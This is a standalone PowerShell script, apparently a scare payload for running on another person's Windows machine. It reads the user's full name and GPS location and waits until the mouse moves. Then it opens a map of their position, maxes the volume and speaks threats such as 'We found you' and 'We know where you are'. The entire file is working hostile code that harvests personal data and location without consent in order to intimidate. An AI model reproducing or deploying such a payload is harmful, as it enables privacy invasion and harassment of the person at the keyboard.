function Get-fullName {
    try {
        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"
        $fullName = ("$fullName").TrimStart("Full Name")
    }
    catch { return $env:UserName }
    return $fullName
}

$FN = Get-fullName

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }
        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Error 'Access Denied for Location Information'
        } else {
            $GeoWatcher.Position.Location | Select Latitude,Longitude
        }
    }
    catch { return "No Coordinates found" }
}

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell
    while (1) {
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) { break }
        else { $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds 3 }
    }
}

$GL  = Get-GeoLocation
$GL  = $GL -split " "
$Lat = $GL[0].Substring(11) -replace ".$"
$Lon = $GL[1].Substring(10) -replace ".$"

Pause-Script

# Open a map of their current location in the default browser
Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
Start-Sleep -s 3

# Volume to max
$k = [Math]::Ceiling(100/2); $o = New-Object -ComObject WScript.Shell; for ($i = 0; $i -lt $k; $i++) { $o.SendKeys([char] 175) }

# Creepy text-to-speech
$s = New-Object -ComObject SAPI.SpVoice
$s.Rate = -2
$s.Speak("We found you $FN")
$s.Speak("We know where you are")
$s.Speak("We are everywhere")
$s.Speak("Expect us")

# Turn CapsLock back off if Pause-Script left it on
Add-Type -AssemblyName System.Windows.Forms
if ([System.Windows.Forms.Control]::IsKeyLocked('CapsLock')) {
    (New-Object -ComObject WScript.Shell).SendKeys('{CapsLock}')
}
